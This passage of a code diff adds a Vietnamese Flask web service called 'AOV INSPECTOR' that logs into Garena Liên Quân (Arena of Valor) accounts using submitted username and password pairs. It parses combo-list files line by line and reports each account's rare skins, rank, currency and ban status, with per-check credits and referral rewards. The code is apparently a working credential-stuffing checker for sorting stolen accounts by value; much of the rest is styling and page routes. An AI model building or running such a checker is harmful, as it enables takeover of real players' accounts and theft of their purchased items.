+                      timeout=10, verify=False)
+            if r.status_code == 200: return r.json()
+        except: pass
+        return None
+
+    def fetch_sale_skins(self):
+        code = self._grant("https://sale.lienquan.garena.vn/login/callback")
+        if not code: return None
+        try:
+            s = requests.Session(); s.verify = False
+            s.get(f"https://sale.lienquan.garena.vn/login/callback?code={code}",
+                  headers={"User-Agent": UA}, timeout=10)
+            gp = {"operationName": "getUser", "variables": {},
+                  "query": "query getUser { getUser { id name profile { ownedItemIdList } } }"}
+            gh = {"Content-Type": "application/json",
+                  "Origin": "https://sale.lienquan.garena.vn",
+                  "Referer": "https://sale.lienquan.garena.vn/", "User-Agent": UA}
+            r = s.post("https://sale.lienquan.garena.vn/graphql",
+                       json=gp, headers=gh, timeout=15)
+            if r.status_code == 200: return r.json()
+        except: pass
+        return None
+
+    def fetch_kientuong_player(self):
+        code = self._grant("https://kientuong.lienquan.garena.vn/auth/login/callback")
+        if not code: return None
+        try:
+            s = requests.Session(); s.verify = False
+            s.get(f"https://kientuong.lienquan.garena.vn/auth/login/callback?code={code}",
+                  headers={"User-Agent": UA}, timeout=10)
+            r = s.get("https://kientuong.lienquan.garena.vn/api/player/get",
+                      headers={"User-Agent": UA, "Referer": "https://kientuong.lienquan.garena.vn/"},
+                      timeout=10, verify=False)
+            if r.status_code != 200: return None
+            d = r.json()
+            if not isinstance(d, dict): return None
+            p = d.get("player") or d.get("data") or {}
+            if not isinstance(p, dict): return None
+            bi = p.get("banInfo") or {}
+            banned = bool(bi.get("isBan") or bi.get("banned"))
+            return {"banned": "YES" if banned else "NO",
+                    "level": p.get("level") or 0,
+                    "rank": p.get("rankName") or "",
+                    "rank_stars": p.get("star") or 0,
+                    "name": p.get("name") or ""}
+        except: return None
+
+def parse_item_info(iid):
+    s = str(iid)
+    if s in SKIN_SSS:
+        return {"item_id": iid, "hero_name": HERO_MAP.get(str(iid // 100), "???"),
+                "skin_name": SKIN_SSS[s], "tier": "SSS"}
+    if s in SKIN_ANIME:
+        return {"item_id": iid, "hero_name": HERO_MAP.get(str(iid // 100), "???"),
+                "skin_name": SKIN_ANIME[s], "tier": "Anime"}
+    if s in SKIN_SS:
+        return {"item_id": iid, "hero_name": HERO_MAP.get(str(iid // 100), "???"),
+                "skin_name": SKIN_SS[s], "tier": "SS"}
+    return None
+
+def parse_file_content(content):
+    accs = []
+    for line in content.splitlines():
+        line = line.strip()
+        if not line: continue
+        for sep in ['|', ':', ' ']:
+            if sep in line:
+                parts = line.split(sep, 1)
+                if len(parts) == 2 and parts[0].strip() and parts[1].strip():
+                    accs.append((parts[0].strip(), parts[1].strip()))
+                    break
+    return accs
+
+def run_single_check(u, p):
+    r = {"type": "failed", "username": u, "password": p, "rank": "", "level": 0,
+         "name": "", "rank_stars": 0, "skins": [], "sss": [], "ss": [], "anime": [],
+         "banned": False, "uid": "", "shell": 0, "error": ""}
+    try:
+        pl = GarenaPipeline(u, p)
+        if not pl.login_full():
+            r["error"] = pl.last_error or "Login failed"
+            return r
+        ad = pl.fetch_account_security()
+        sd = pl.fetch_sale_skins()
+        kd = pl.fetch_kientuong_player()
+        usr = {}
+        if ad and isinstance(ad, dict):
+            if "user_info" in ad and isinstance(ad["user_info"], dict): usr = ad["user_info"]
+            elif "data" in ad and isinstance(ad["data"], dict): usr = ad["data"]
+            else: usr = ad
+        r["uid"] = usr.get('uid', pl.garena_uid or 'N/A')
+        r["shell"] = usr.get('shell', 0)
+        skins = []
+        if sd:
+            up = ((sd.get("data") or {}).get("getUser") or {}).get("profile") or {}
+            oids = up.get("ownedItemIdList") or []
+            for iid in oids:
+                info = parse_item_info(iid)
+                if info: skins.append(info)
+        r["skins"] = skins
+        r["sss"] = [s for s in skins if s['tier'] == 'SSS']
+        r["ss"] = [s for s in skins if s['tier'] == 'SS']
+        r["anime"] = [s for s in skins if s['tier'] == 'Anime']
+        if kd:
+            r["banned"] = kd.get('banned') == 'YES'
+            r["rank"] = kd.get('rank', '')
+            r["level"] = kd.get('level', 0)
+            r["name"] = kd.get('name', '')
+            r["rank_stars"] = kd.get('rank_stars', 0)
+        if r["banned"]: r["type"] = "banned"
+        elif r["sss"]: r["type"] = "sss"
+        elif r["anime"]: r["type"] = "anime"
+        elif r["ss"]: r["type"] = "ss"
+        else: r["type"] = "normal"
+    except Exception as e:
+        r["error"] = str(e); r["type"] = "failed"
+    return r
+
+def format_result(r, short=False):
+    lines = []
+    t = r.get("type", "unknown")
+    icons = {"sss": "◈", "ss": "◆", "anime": "◇", "normal": "▪", "banned": "✖", "failed": "✕"}
+    lines.append(f"{icons.get(t, '?')} [{t.upper()}] {r.get('username','')}|{r.get('password','')}")
+    if t == "failed":
+        lines.append(f"   └─ {r.get('error','')}")
+        return "\n".join(lines)
+    lines.append(f"   ├─ UID: {r.get('uid','N/A')}")
+    lines.append(f"   ├─ Nick: {r.get('name','') or 'Chưa đặt'}")
+    lines.append(f"   ├─ Rank: {r.get('rank','')} ({r.get('rank_stars',0)}★)")
+    lines.append(f"   ├─ Level: {r.get('level',0)}")
+    lines.append(f"   ├─ Sò: {r.get('shell',0)}")
+    lines.append(f"   ├─ BAN: {'RED' if r.get('banned') else 'CLEAN'}")
+    lines.append(f"   └─ Skin: {len(r.get('skins',[]))}")
+    if not short:
+        if r.get("sss"):
+            lines.append(f"\n   ╔══ SSS ({len(r['sss'])}) ══╗")
+            for s in r["sss"][:20]: lines.append(f"   ║ {s['hero_name']} → {s['skin_name']}")
+        if r.get("anime"):
+            lines.append(f"\n   ╔══ ANIME ({len(r['anime'])}) ══╗")
+            for s in r["anime"][:20]: lines.append(f"   ║ {s['hero_name']} → {s['skin_name']}")
+        if r.get("ss"):
+            lines.append(f"\n   ╔══ SS ({len(r['ss'])}) ══╗")
+            for s in r["ss"][:20]: lines.append(f"   ║ {s['hero_name']} → {s['skin_name']}")
+    return "\n".join(lines)
+
+# ============================ UI SYSTEM - UNIQUE DESIGN ============================
+BASE_CSS = """
+<style>
+@import url('https://fonts.googleapis.com/css2?family=Space+Mono:wght@400;700&family=Bebas+Neue&family=Inter:wght@400;600;800&display=swap');
+
+* { margin: 0; padding: 0; box-sizing: border-box; -webkit-tap-highlight-color: transparent; }
+
+:root {
+    --bg-primary: #0d0d15;
+    --bg-secondary: #16161f;
+    --bg-card: #1a1a25;
+    --bg-elevated: #20202e;
+    --accent-primary: #ff2951;
+    --accent-secondary: #ffb800;
+    --accent-tertiary: #00e5ff;
+    --text-primary: #ffffff;
+    --text-secondary: #8b8b9a;
+    --text-muted: #5a5a6e;
+    --border-color: #26263a;
+    --success: #00e676;
+    --warning: #ffb800;
+    --danger: #ff2951;
+}
+
+body {
+    font-family: 'Inter', sans-serif;
+    background: var(--bg-primary);
+    color: var(--text-primary);
+    min-height: 100vh;
+    padding-bottom: 100px;
+    position: relative;
+    overflow-x: hidden;
+}
+
+/* Animated background orbs */
+body::before, body::after {
+    content: '';
+    position: fixed;
+    border-radius: 50%;
+    filter: blur(100px);
+    opacity: 0.15;
+    z-index: 0;
+    pointer-events: none;
+}
+body::before {
+    width: 400px; height: 400px;
+    background: var(--accent-primary);
+    top: -200px; left: -100px;
+    animation: floatOrb 15s ease-in-out infinite;
+}
+body::after {
+    width: 500px; height: 500px;
+    background: var(--accent-tertiary);
+    bottom: -250px; right: -150px;
+    animation: floatOrb 20s ease-in-out infinite reverse;
+}
+
+@keyframes floatOrb {
+    0%, 100% { transform: translate(0, 0) scale(1); }
+    50% { transform: translate(50px, -50px) scale(1.1); }
+}
+
+.container {
+    max-width: 720px;
+    margin: 0 auto;
+    padding: 16px;
+    position: relative;
+    z-index: 1;
+}
+
+/* Top Header */
+.app-header {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    padding: 12px 16px;
+    background: rgba(26, 26, 37, 0.85);
+    backdrop-filter: blur(20px);
+    border: 1px solid var(--border-color);
+    border-radius: 16px;
+    margin-bottom: 16px;
+    position: sticky;
+    top: 12px;
+    z-index: 100;
+    box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+}
+
+.app-logo {
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    font-family: 'Bebas Neue', sans-serif;
+    font-size: 1.35em;
+    letter-spacing: 2px;
+    background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
+    -webkit-background-clip: text;
+    -webkit-text-fill-color: transparent;
+    background-clip: text;
+}
+
+.app-logo-icon {
+    width: 36px;
+    height: 36px;
+    border-radius: 10px;
+    background: linear-gradient(135deg, var(--accent-primary), var(--accent-secondary));
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    font-size: 1.2em;
+    box-shadow: 0 0 20px rgba(255, 41, 81, 0.5);
+    -webkit-text-fill-color: initial;
+}
+
+.balance-pill {
+    display: flex;
+    align-items: center;
+    gap: 6px;
+    padding: 8px 14px;
+    background: rgba(255, 41, 81, 0.12);
+    border: 1px solid rgba(255, 41, 81, 0.3);
+    border-radius: 30px;
+    font-weight: 700;
+    font-size: 0.9em;
+    color: var(--accent-primary);
+}
+
+.logout-btn {
+    padding: 8px 16px;
+    background: var(--bg-elevated);
+    border: 1px solid var(--border-color);
+    border-radius: 30px;
+    color: var(--text-secondary);
+    text-decoration: none;
+    font-size: 0.85em;
+    font-weight: 600;
+    transition: all 0.3s;
+}
+.logout-btn:hover { color: var(--accent-primary); border-color: var(--accent-primary); }
+
+/* Tab Scroll */
+.tab-scroll {
+    display: flex;
+    gap: 10px;
+    overflow-x: auto;
+    padding-bottom: 8px;
+    margin-bottom: 16px;
+    scrollbar-width: none;
+}
+.tab-scroll::-webkit-scrollbar { display: none; }
+
+.tab-chip {
+    flex-shrink: 0;
+    display: flex;
+    align-items: center;
+    gap: 8px;
+    padding: 12px 20px;
+    background: var(--bg-card);
+    border: 1px solid var(--border-color);
+    border-radius: 14px;
+    color: var(--text-secondary);
+    text-decoration: none;
+    font-weight: 600;
+    font-size: 0.9em;
+    transition: all 0.3s;
+    white-space: nowrap;
+}
+.tab-chip.active {
+    background: rgba(255, 41, 81, 0.15);
+    border-color: var(--accent-primary);
+    color: var(--accent-primary);
+    box-shadow: 0 0 20px rgba(255, 41, 81, 0.2);
+}
+.tab-chip:hover { border-color: var(--accent-primary); color: var(--accent-primary); }
+
+/* Card */
+.card {
+    background: var(--bg-card);
+    border: 1px solid var(--border-color);
+    border-radius: 20px;
+    padding: 20px;
+    margin-bottom: 16px;
+    position: relative;
+    overflow: hidden;
+}
+
+.card::before {
+    content: '';
+    position: absolute;
+    top: 0; left: 0; right: 0;
+    height: 2px;
+    background: linear-gradient(90deg, transparent, var(--accent-primary), var(--accent-secondary), transparent);
+    opacity: 0.5;
+}
+
+.card-title {
+    font-family: 'Bebas Neue', sans-serif;
+    font-size: 1.6em;
+    letter-spacing: 1.5px;
+    margin-bottom: 16px;
+    color: var(--text-primary);
+    display: flex;
+    align-items: center;
+    gap: 10px;
+}
+.card-title-icon {
+    font-size: 0.85em;
+}
+
+/* Form */
+.form-group { margin-bottom: 16px; }
+.form-label {
+    display: block;
+    font-size: 0.85em;
+    color: var(--text-secondary);
+    margin-bottom: 8px;
+    font-weight: 600;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+}
+.form-input, .form-textarea, .form-select {
+    width: 100%;
+    padding: 14px 16px;
+    background: var(--bg-secondary);
+    border: 1.5px solid var(--border-color);
+    border-radius: 12px;
+    color: var(--text-primary);
+    font-size: 0.95em;
+    font-family: inherit;
+    transition: all 0.3s;
+}
+.form-input:focus, .form-textarea:focus, .form-select:focus {
+    outline: none;
+    border-color: var(--accent-primary);
+    box-shadow: 0 0 0 3px rgba(255, 41, 81, 0.1);
+}
+.form-input::placeholder, .form-textarea::placeholder {
+    color: var(--text-muted);
+}
+.form-textarea { min-height: 100px; resize: vertical; font-family: 'Space Mono', monospace; }
+
+/* Buttons */
+.btn {
+    display: inline-flex;
+    align-items: center;
+    justify-content: center;
+    gap: 8px;
+    padding: 14px 24px;
+    background: linear-gradient(135deg, var(--accent-primary), #ff1e3c);
+    color: #fff;
+    border: none;
+    border-radius: 12px;
+    font-weight: 700;
+    font-size: 0.95em;
+    cursor: pointer;
+    text-decoration: none;
+    transition: all 0.3s;
+    font-family: inherit;
+    letter-spacing: 0.5px;
+    box-shadow: 0 4px 20px rgba(255, 41, 81, 0.3);
+}
+.btn:hover { transform: translateY(-2px); box-shadow: 0 8px 30px rgba(255, 41, 81, 0.5); }
+.btn:active { transform: translateY(0); }
+.btn-block { display: flex; width: 100%; }
+.btn-secondary {
+    background: var(--bg-elevated);
+    border: 1.5px solid var(--border-color);
+    color: var(--text-primary);
+    box-shadow: none;
+}
+.btn-secondary:hover { border-color: var(--accent-primary); box-shadow: 0 4px 20px rgba(255, 41, 81, 0.2); }
+.btn-success {
+    background: linear-gradient(135deg, var(--success), #00c853);
+    box-shadow: 0 4px 20px rgba(0, 230, 118, 0.3);
+}
+.btn-warning {
+    background: linear-gradient(135deg, var(--warning), #ff8f00);
+    color: #000;
+    box-shadow: 0 4px 20px rgba(255, 184, 0, 0.3);
+}
+.btn-danger {
+    background: linear-gradient(135deg, var(--danger), #d50000);
+    box-shadow: 0 4px 20px rgba(255, 41, 81, 0.3);
+}
+.btn-sm { padding: 8px 16px; font-size: 0.85em; }
+
+/* Stats grid */
+.stat-grid {
+    display: grid;
+    grid-template-columns: repeat(2, 1fr);
+    gap: 12px;
+}
+.stat-box {
+    background: var(--bg-secondary);
+    border: 1px solid var(--border-color);
+    border-radius: 14px;
+    padding: 16px;
+    text-align: center;
+    transition: all 0.3s;
+}
+.stat-box:hover { border-color: var(--accent-primary); }
+.stat-value {
+    font-family: 'Bebas Neue', sans-serif;
+    font-size: 2.2em;
+    letter-spacing: 1px;
+    color: var(--accent-primary);
+    line-height: 1;
+    margin-bottom: 6px;
+}
+.stat-label {
+    font-size: 0.75em;
+    color: var(--text-secondary);
+    text-transform: uppercase;
+    letter-spacing: 1px;
+    font-weight: 600;
+}
+
+/* Flash messages */
+.flash {
+    padding: 14px 16px;
+    border-radius: 12px;
+    margin-bottom: 12px;
+    font-weight: 600;
+    font-size: 0.9em;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+    animation: slideDown 0.3s ease;
+}
+@keyframes slideDown {
+    from { transform: translateY(-20px); opacity: 0; }
+    to { transform: translateY(0); opacity: 1; }
+}
+.flash.error {
+    background: rgba(255, 41, 81, 0.12);
+    border: 1px solid rgba(255, 41, 81, 0.4);
+    color: #ff6b8a;
+}
+.flash.success {
+    background: rgba(0, 230, 118, 0.12);
+    border: 1px solid rgba(0, 230, 118, 0.4);
+    color: #66ffb0;
+}
+
+/* Result box */
+.result-box {
+    background: #0a0a0f;
+    border: 1px solid var(--border-color);
+    border-radius: 14px;
+    padding: 16px;
+    font-family: 'Space Mono', monospace;
+    font-size: 0.8em;
+    line-height: 1.7;
+    color: #e0e0e0;
+    white-space: pre-wrap;
+    word-break: break-word;
+    overflow-x: auto;
+    max-height: 600px;
+    overflow-y: auto;
+}
+
+/* Bottom nav */
+.bottom-nav {
+    position: fixed;
+    bottom: 0; left: 0; right: 0;
+    background: rgba(13, 13, 21, 0.95);
+    backdrop-filter: blur(20px);
+    border-top: 1px solid var(--border-color);
+    display: flex;
+    justify-content: space-around;
+    padding: 8px 0 max(8px, env(safe-area-inset-bottom));
+    z-index: 1000;
+}
+
+.nav-item {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    gap: 4px;
+    padding: 8px 12px;
+    color: var(--text-muted);
+    text-decoration: none;
+    font-size: 0.7em;
+    font-weight: 600;
+    transition: all 0.3s;
+    border-radius: 10px;
+    position: relative;
+}
+.nav-item.active { color: var(--accent-primary); }
+.nav-item.active::before {
+    content: '';
+    position: absolute;
+    top: -8px; left: 50%;
+    transform: translateX(-50%);
+    width: 30px; height: 3px;
+    background: var(--accent-primary);
+    border-radius: 0 0 3px 3px;
+    box-shadow: 0 0 10px var(--accent-primary);
+}
+.nav-icon {
+    font-size: 1.5em;
+    line-height: 1;
+}
+.nav-badge {
+    position: absolute;
+    top: 4px; right: 4px;
+    background: var(--accent-primary);
+    color: #fff;
+    font-size: 0.6em;
+    padding: 2px 6px;
+    border-radius: 10px;
+    font-weight: 700;
+    min-width: 18px;
+    text-align: center;
+}
+
+/* Header tabs */
+.top-tabs {
+    display: flex;
+    gap: 8px;
+    overflow-x: auto;
+    padding-bottom: 4px;
+    margin-bottom: 16px;
+    scrollbar-width: none;
+}
+.top-tabs::-webkit-scrollbar { display: none; }
+
+/* List item */
+.list-item {
+    background: var(--bg-secondary);
+    border: 1px solid var(--border-color);
+    border-radius: 12px;
+    padding: 14px 16px;
+    margin-bottom: 8px;
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+    gap: 12px;
+    transition: all 0.3s;
+}
+.list-item:hover { border-color: var(--accent-primary); }
+
+/* Info row */
+.info-row {
+    display: flex;
+    justify-content: space-between;
+    padding: 12px 0;
+    border-bottom: 1px solid var(--border-color);
+    font-size: 0.9em;
+}
+.info-row:last-child { border-bottom: none; }
+.info-label { color: var(--text-secondary); font-weight: 600; }
+.info-value { color: var(--text-primary); font-weight: 700; }
+
+/* Notification popup */
+.notif-popup {
+    position: fixed;
+    top: 20px;
+    left: 50%;
+    transform: translateX(-50%);
+    background: var(--bg-elevated);
+    border: 1.5px solid var(--accent-primary);
+    border-radius: 16px;
+    padding: 16px 20px;
+    max-width: calc(100% - 32px);
+    width: 400px;
+    z-index: 9999;
+    box-shadow: 0 20px 60px rgba(255, 41, 81, 0.4);
+    animation: popupIn 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+}
+@keyframes popupIn {
+    from { transform: translate(-50%, -100px); opacity: 0; }
+    to { transform: translate(-50%, 0); opacity: 1; }
+}
+.notif-popup .notif-head {
+    display: flex;
+    justify-content: space-between;
+    align-items: center;
+    margin-bottom: 8px;
+}
+.notif-popup .notif-head-title {
+    font-weight: 800;
+    color: var(--accent-primary);
+    font-size: 0.95em;
+}
+.notif-popup .notif-head-close {
+    background: none;
+    border: none;
+    color: var(--text-secondary);
+    font-size: 1.2em;
+    cursor: pointer;
+    padding: 0 4px;
+}
+.notif-popup .notif-body {
+    color: var(--text-secondary);
+    font-size: 0.85em;
+    line-height: 1.5;
+    margin-bottom: 10px;
+}
+.notif-popup .notif-action {
+    color: var(--accent-primary);
+    text-decoration: none;
+    font-weight: 700;
+    font-size: 0.85em;
+}
+
+/* Section divider */
+.section-title {
+    font-family: 'Bebas Neue', sans-serif;
+    font-size: 1.3em;
+    letter-spacing: 1.5px;
+    color: var(--text-secondary);
+    margin: 20px 0 12px;
+    display: flex;
+    align-items: center;
+    gap: 10px;
+}
+.section-title::after {
+    content: '';
+    flex: 1;
+    height: 1px;
+    background: linear-gradient(90deg, var(--border-color), transparent);
+}
+
+/* Scrollbar */
+::-webkit-scrollbar { width: 8px; height: 8px; }
+::-webkit-scrollbar-track { background: transparent; }
+::-webkit-scrollbar-thumb { background: var(--border-color); border-radius: 4px; }
+::-webkit-scrollbar-thumb:hover { background: var(--accent-primary); }
+
+@media (max-width: 480px) {
+    .container { padding: 12px; }
+    .card { padding: 16px; border-radius: 16px; }
+    .card-title { font-size: 1.4em; }
+    .app-header { padding: 10px 12px; }
+    .app-logo { font-size: 1.15em; }
+    .stat-value { font-size: 1.8em; }
+}
+</style>
+"""
+
+NOTIF_JS = """
+<script>
+let shownIds = new Set();
+function checkNotifs() {
+    fetch('/api/notif')
+        .then(r => r.json())
+        .then(d => {
+            if (d.count > 0 && d.latest && !shownIds.has(d.latest.id)) {
+                shownIds.add(d.latest.id);
+                showPopup(d.latest, d.count);
+            }
+            const badge = document.getElementById('nav-notif-badge');
+            if (badge) {
+                if (d.count > 0) { badge.style.display = 'block'; badge.textContent = d.count > 9 ? '9+' : d.count; }
+                else { badge.style.display = 'none'; }
+            }
+        }).catch(() => {});
+}
+function showPopup(n, count) {
+    const ex = document.getElementById('notif-popup');
+    if (ex) ex.remove();
+    const p = document.createElement('div');
+    p.id = 'notif-popup';
+    p.className = 'notif-popup';
+    p.innerHTML = '<div class="notif-head">' +
+        '<div class="notif-head-title">◈ THÔNG BÁO</div>' +
+        '<button class="notif-head-close" onclick="this.parentElement.parentElement.remove(); markRead();">✕</button>' +
+        '</div>' +
+        '<div style="font-weight:700; margin-bottom:6px;">' + escapeHtml(n.title) + '</div>' +
+        '<div class="notif-body">' + escapeHtml(n.content.substring(0, 150)) + (n.content.length > 150 ? '...' : '') + '</div>' +
+        '<div style="font-size:0.7em; color:var(--text-muted); margin-bottom:8px;">Từ: ' + escapeHtml(n.admin) + ' · ' + n.time + '</div>' +
+        '<a href="/notifications" class="notif-action">XEM TẤT CẢ (' + count + ') →</a>';
+    document.body.appendChild(p);
+    setTimeout(() => { if (p.parentElement) p.remove(); }, 15000);
+}
+function markRead() {
+    fetch('/api/notif/read', { method: 'POST' });
+}
+function escapeHtml(s) {
+    const d = document.createElement('div');
+    d.textContent = s;
+    return d.innerHTML;
+}
+checkNotifs();
+setInterval(checkNotifs, 25000);
+</script>
+"""
+
+def render_page(content, active_tab="check", user=None, extra_js=""):
+    unread = get_unread_count(session.get("username", "")) if user else 0
+    nav_items = [
+        ("check", "/check", "◈", "Check"),
+        ("tu_tien", "/tu_tien", "⚔", "Tu Tiên"),
+        ("weapon", "/tu_tien?action=vukhi", "⚡", "Vũ Khí"),
+        ("notifications", "/notifications", "◉", "Thông Báo"),
+        ("profile", "/profile", "◐", "Cá Nhân"),
+    ]
+    nav_html = ""
+    for tid, url, icon, label in nav_items:
+        active = "active" if tid == active_tab else ""
+        badge = ""
+        if tid == "notifications" and unread > 0:
+            badge = f'<span class="nav-badge" id="nav-notif-badge">{unread if unread < 10 else "9+"}</span>'
+        else:
+            badge = '<span class="nav-badge" id="nav-notif-badge" style="display:none;">0</span>' if tid == "notifications" else ""
+        nav_html += f'<a href="{url}" class="nav-item {active}"><span class="nav-icon">{icon}</span><span>{label}</span>{badge}</a>'
+
+    balance = user.get("balance", 0) if user else 0
+    header = ""
+    if user:
+        header = f'''
+        <div class="app-header">
+            <div class="app-logo">
+                <div class="app-logo-icon">◈</div>
+                <span>AOV INSPECTOR</span>
+            </div>
+            <div style="display:flex; gap:8px; align-items:center;">
+                <div class="balance-pill">◈ {balance}</div>
+                <a href="/logout" class="logout-btn">Thoát</a>
+            </div>
+        </div>
+        '''
+    return f'''<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+<meta name="theme-color" content="#0d0d15">
+<title>AOV INSPECTOR</title>
+{BASE_CSS}
+</head>
+<body>
+<div class="container">
+{header}
+{content}
+</div>
+<nav class="bottom-nav">{nav_html}</nav>
+{NOTIF_JS}
+{extra_js}
+</body>
+</html>'''
+
+# ============================ ROUTES ============================
+@app.route("/")
+@login_required
+def index():
+    return redirect(url_for("check_page"))
+
+@app.route("/login", methods=["GET", "POST"])
+def login_page():
+    if request.method == "POST":
+        u = request.form.get("username", "").strip()
+        p = request.form.get("password", "")
+        usr = USERS.get(u)
+        if usr and usr["password"] == hash_password(p):
+            session["username"] = u
+            flash(f"Chào mừng {u}!", "success")
+            return redirect(url_for("check_page"))
+        flash("Sai tài khoản hoặc mật khẩu!", "error")
+    content = f'''
+    <div class="card" style="margin-top:40px; text-align:center;">
+        <div style="font-size:3em; margin-bottom:8px;">◈</div>
+        <h1 class="card-title" style="justify-content:center;">AOV INSPECTOR</h1>
+        <p style="color:var(--text-secondary); margin-bottom:24px;">Hệ thống kiểm tra tài khoản Liên Quân</p>
+        <div style="display:flex; gap:8px; margin-bottom:24px;">
+            <a href="/login" class="btn btn-block" style="flex:1;">ĐĂNG NHẬP</a>
+            <a href="/register" class="btn btn-secondary btn-block" style="flex:1;">ĐĂNG KÝ</a>
+        </div>
+        {render_flash()}
+        <form method="POST">
+            <div class="form-group">
+                <label class="form-label">Tên đăng nhập</label>
+                <input type="text" name="username" class="form-input" placeholder="Nhập username..." required>
+            </div>
+            <div class="form-group">
+                <label class="form-label">Mật khẩu</label>
+                <input type="password" name="password" class="form-input" placeholder="Nhập mật khẩu..." required>
+            </div>
+            <button type="submit" class="btn btn-block">ĐĂNG NHẬP</button>
+        </form>
+    </div>
+    '''
+    return render_page(content, active_tab="", user=None)
+
+@app.route("/register", methods=["GET", "POST"])
+def register_page():
+    if request.method == "POST":
+        u = request.form.get("username", "").strip()
+        p = request.form.get("password", "")
+        cf = request.form.get("confirm", "")
+        ref = request.form.get("ref", "").strip().upper()
+        if not u or len(u) < 3 or len(u) > 20 or not u.isalnum():
+            flash("Username 3-20 ký tự chữ/số!", "error")
+        elif len(p) < 4:
+            flash("Mật khẩu ít nhất 4 ký tự!", "error")
+        elif p != cf:
+            flash("Mật khẩu không khớp!", "error")
+        elif u in USERS:
+            flash("Username đã tồn tại!", "error")
+        else:
+            uid = gen_id()
+            inviter = None
+            for un, uu in USERS.items():
+                if uu.get("id") == ref: inviter = un; break
+            USERS[u] = {
+                "id": uid, "username": u, "password": hash_password(p),
+                "balance": DEFAULT_BALANCE, "temp_balance": 0,
+                "referrals": 0, "invited_by": inviter, "is_admin": False,
+                "created_at": time.time(), "last_checkin": 0,
+                "last_notif_read": 0, "checkin_streak": 0, "total_checkins": 0,
+                "cultivation": {"level": 0, "exp": 0, "hp": 100, "atk": 20, "def": 10,
+                                "weapon": None, "mon_phai": None, "mon_phai_level": 0},
+                "mission": {"total_acc": 0, "sss": 0, "ss": 0, "anime": 0, "xu_used": 0, "claimed": []},
+                "history": [],
+            }
+            if inviter and inviter in USERS:
+                USERS[inviter]["referrals"] = USERS[inviter].get("referrals", 0) + 1
+                USERS[inviter]["balance"] += REFERRAL_REWARD
+                USERS[u]["balance"] += REFERRAL_BONUS
+            save_data()
+            session["username"] = u
+            flash(f"Đăng ký thành công! ID: {uid}", "success")
+            return redirect(url_for("check_page"))
+    content = f'''
+    <div class="card" style="margin-top:40px;">
+        <div style="font-size:3em; text-align:center; margin-bottom:8px;">✦</div>
+        <h1 class="card-title" style="justify-content:center;">ĐĂNG KÝ</h1>
+        <p style="color:var(--text-secondary); text-align:center; margin-bottom:24px;">Tạo tài khoản mới để bắt đầu</p>
+        <div style="display:flex; gap:8px; margin-bottom:24px;">
+            <a href="/login" class="btn btn-secondary btn-block" style="flex:1;">ĐĂNG NHẬP</a>
+            <a href="/register" class="btn btn-block" style="flex:1;">ĐĂNG KÝ</a>
+        </div>
+        {render_flash()}
+        <form method="POST">
+            <div class="form-group">
+                <label class="form-label">Username</label>
+                <input type="text" name="username" class="form-input" placeholder="3-20 ký tự..." required minlength="3" maxlength="20">
+            </div>
+            <div class="form-group">
+                <label class="form-label">Mật khẩu</label>
+                <input type="password" name="password" class="form-input" placeholder="Ít nhất 4 ký tự..." required minlength="4">
+            </div>
+            <div class="form-group">
+                <label class="form-label">Xác nhận mật khẩu</label>
+                <input type="password" name="confirm" class="form-input" placeholder="Nhập lại..." required minlength="4">
+            </div>
+            <div class="form-group">
+                <label class="form-label">Mã người mời (không bắt buộc)</label>
+                <input type="text" name="ref" class="form-input" placeholder="VD: AOV-XXXX-XXXX">
+            </div>
+            <button type="submit" class="btn btn-success btn-block">TẠO TÀI KHOẢN</button>
+        </form>
+    </div>
+    '''
+    return render_page(content, active_tab="", user=None)
+
+def render_flash():
+    from flask import get_flashed_messages
+    msgs = get_flashed_messages(with_categories=True)
+    if not msgs: return ""
+    html = ""
+    for cat, m in msgs:
+        icon = "✕" if cat == "error" else "✓"
+        html += f'<div class="flash {cat}"><span>{icon}</span><span>{m}</span></div>'
+    return html
+
+@app.route("/logout")
+def logout():
+    session.pop("username", None)
+    flash("Đã đăng xuất!", "success")
+    return redirect(url_for("login_page"))
+
+@app.route("/check", methods=["GET", "POST"])
+@login_required
+def check_page():
+    user = get_current_user()
+    result = None
+    if request.method == "POST":
+        acc = request.form.get("account", "").strip()
+        pwd = request.form.get("password", "").strip()
+        if not acc or not pwd:
+            flash("Nhập đầy đủ tài khoản và mật khẩu!", "error")
+        elif user["balance"] < 1:
+            flash("Không đủ lượt! Cần 1 lượt.", "error")
+        else:
+            user["balance"] -= 1
+            save_data()
+            try:
+                r = run_single_check(acc, pwd)
+                result = format_result(r)
+                user["history"] = user.get("history", [])[-49:] + [{
+                    "acc": acc, "result": r.get("type", "unknown"),
+                    "time": datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+                }]
+                user["mission"]["total_acc"] = user["mission"].get("total_acc", 0) + 1
+                if r["type"] == "sss": user["mission"]["sss"] = user["mission"].get("sss", 0) + 1
+                elif r["type"] == "ss": user["mission"]["ss"] = user["mission"].get("ss", 0) + 1
+                elif r["type"] == "anime": user["mission"]["anime"] = user["mission"].get("anime", 0) + 1
+                save_data()
+            except Exception as e:
+                result = f"✕ Lỗi: {e}"
+                flash(f"Lỗi: {e}", "error")
+    m = user.get("mission", {})
+    content = f'''
+    <div class="tab-scroll">
+        <a href="/check" class="tab-chip active">◈ Check Acc</a>
+        <a href="/check_file" class="tab-chip">▣ Check File</a>
+        <a href="/enter_code" class="tab-chip">◆ Nhập Code</a>
+    </div>
+
+    <div class="card">
+        <h2 class="card-title"><span class="card-title-icon">◈</span> Check Tài Khoản</h2>
+        {render_flash()}
+        <form method="POST">
+            <div class="form-group">
+                <label class="form-label">Tài khoản</label>
+                <input type="text" name="account" class="form-input" placeholder="user hoặc email..." required autocomplete="off">
+            </div>
+            <div class="form-group">
+                <label class="form-label">Mật khẩu</label>
+                <input type="password" name="password" class="form-input" placeholder="mật khẩu..." required>
+            </div>
+            <button type="submit" class="btn btn-block">CHECK NGAY (1 LƯỢT)</button>
+        </form>
+    </div>
+
